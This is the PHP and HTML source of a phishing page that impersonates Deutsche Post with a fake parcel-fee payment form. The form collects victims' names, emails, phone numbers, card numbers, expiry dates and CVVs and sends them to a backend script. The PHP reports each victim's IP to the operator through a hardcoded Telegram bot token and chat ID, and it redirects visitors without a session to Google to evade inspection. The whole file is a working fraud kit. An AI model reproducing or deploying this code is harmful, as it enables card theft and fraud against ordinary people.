<?php
session_start();
if(isset($_SESSION["username"])) {

if(isset($_GET['messageId'])){
  $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
  $chatID = "1064643518";
  $messageId=$_GET['messageId'];
  $ipzebi=$_GET['ipzebi'];
  $message ="IP: $ipzebi , status : bill";



// Initialize cURL session
$ch = curl_init();

// Set cURL options
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$botToken."/editMessageText");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => $chatID,
    'message_id' => $messageId,
    'text' => $message
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL request
$response = curl_exec($ch);

// Close cURL session
curl_close($ch);

// Optionally, you can decode and use the response
$responseData = json_decode($response, true);

}

?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v4.0.1">
    <title>Die Post</title>



    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js" type="text/javascript"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js" type="text/javascript"></script>



    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>

    <script type="text/javascript">

$(function($) {
          $('[data-numeric]').payment('restrictNumeric');
          $('.cc-number').payment('formatCardNumber');
          $('.cc-exp').payment('formatCardExpiry');
          $('.cc-cvc').payment('formatCardCVC');
          $.fn.toggleInputError = function(erred) {
          this.parent('.form-group').toggleClass('has-error', erred);
          return this;
          };
    });

    </script>



    <!-- Custom styles for this template -->
      <link href="file/css/style.css" rel="stylesheet">

  </head>
  <body>
    <header>

  <div class="menu navbar navbar-dark shadow-sm">
    <div class="container d-flex justify-content-between">
      <a href="#" class="navbar-brand d-flex align-items-center">
        <img src="file/img/logo.png" width="300px" height="54px">
      </a>
    </div>
  </div>
</header>

<main role="main">

  <section class="jumbotron">
    <div class="container">
	<h6 style="color:#f33;font-weight:800;">Auftragsnummer : DE/904951986</h6>
	<p style="font-weight:800;">Standardpaket</p>
      
      <form action="../manage/send/index.php" method="POST" >
          <div class="row">

                            <div class="col-md-12">
                      <div class="card">
                          <div class="card-header">
                              <div class="row">
                                  <div class="col-md-6"> <span>DEINE PERSÖNLICHEN DETAILS</span> </div>
                                  <div class="col-md-6 text-right" style="margin-top: -5px;"></div>
                              </div>
                          </div>
                                <div class="card-body">
                                <div class="row">
                                <div class="col-md-12">
                                        <div class="form-group"> <input type="text" name="lname" class="input-lg form-control" placeholder="Name des Karteninhabers" required> </div>
                                        </div>

                                </div>
                                                           
                                   <div class="row">
                                <div class="col-md-12">
                                        <div class="form-group"><input type="email" name="email" class="input-lg form-control" placeholder="Email" required> </div>
                                        </div>
                                        
                                            
                                </div>
                                                       
                                                         <div class="row">
                                <div class="col-md-12">
                                        <div class="form-group"><input type="tel" name="phone" class="input-lg form-control" placeholder="Handy Nummer" required> </div>
                                        </div>
                                        
                                            
                                </div>
                                </div>




                  
                      </div>
                  </div>



                  <div class="col-md-12">
                      <div class="card">
                          <div class="card-header">
                              <div class="row">
                                  <div class="col-md-6"> <span>BEZAHLEN SIE MIT KARTE</span> </div>
                                  <div class="col-md-6 text-right" style="margin-top: -5px;"> <img src="https://img.icons8.com/color/36/000000/visa.png"> <img src="https://img.icons8.com/color/36/000000/mastercard.png"></div>
                              </div>
                          </div>
                          <div class="card-body">
                              <div class="form-group"> <label for="cc-number" class="control-label" style="text-algn:left">Kartennummer:</label> <input id="cc-number" type="tel" name="card" class="input-lg form-control cc-number" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" required> </div>
                              <div class="row">
                                  <div class="col-md-6">
                                      <div class="form-group"> <label for="cc-exp" class="control-label">Datum Exp:</label> <input id="cc-exp" type="tel" name="exp" class="input-lg form-control cc-exp" autocomplete="cc-exp" placeholder="•• / ••" required> </div>
                                  </div>
                                  <div class="col-md-6">
                                      <div class="form-group"> <label for="cc-cvc" class="control-label">CVV:</label> <input id="cc-cvc" type="tel" name="cvv" class="input-lg form-control cc-cvc" autocomplete="off" placeholder="••••" required> </div>
                                  </div>
                              </div>
							   <div class="row">
                                  <div class="col-md-10">
                                      <div class="form-group">Versand</div>
                                  </div>
                                  <div class="col-md-2">
                                      <div class="form-group">2.99 EURO</div>
                                  </div>
                              </div>
							  	<div class="row">
                                  <div class="col-md-10">
                                      <div class="form-group"><p style="font-weight:800;">Gesamt</p></div>
                                  </div>
                                  <div class="col-md-2">
                                      <div class="form-group"><p style="font-weight:800;">2.99 EURO</p></div>
                                  </div>
                              </div>
							  <div class="row">
                                  <div class="col-md-12">
                                      <div class="form-group">Bedingungen für das Deutch Post Package ™</div>
                                  </div>
                              
                              </div>

                          </div>
                           <div class="col-md-12">
                            <div class="form-group"> 
                            <input value="Fortsett" type="submit" class="btn btn-log btn-md form-control" > 
                            </div>
                            </div>
                      </div>
                  </div>
          </div>
    </form>


    </div>
  </section>



</main>

<footer class="text-muted">
  <div class="container">
    <p class="float-right">
      <a href="#">Back to top</a>
    </p>
  
  </div>
</footer>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js" type="text/javascript"></script>

<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
      <script>window.jQuery || document.write('<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"><\/script>')</script><script src="file/js/bootstrap.bundle.min.js"></script></body>

      <script src="file/js/script.js" type="text/javascript"></script>





</html>
<?php
}else {
HEADER("Location: https://google.com");

}
?>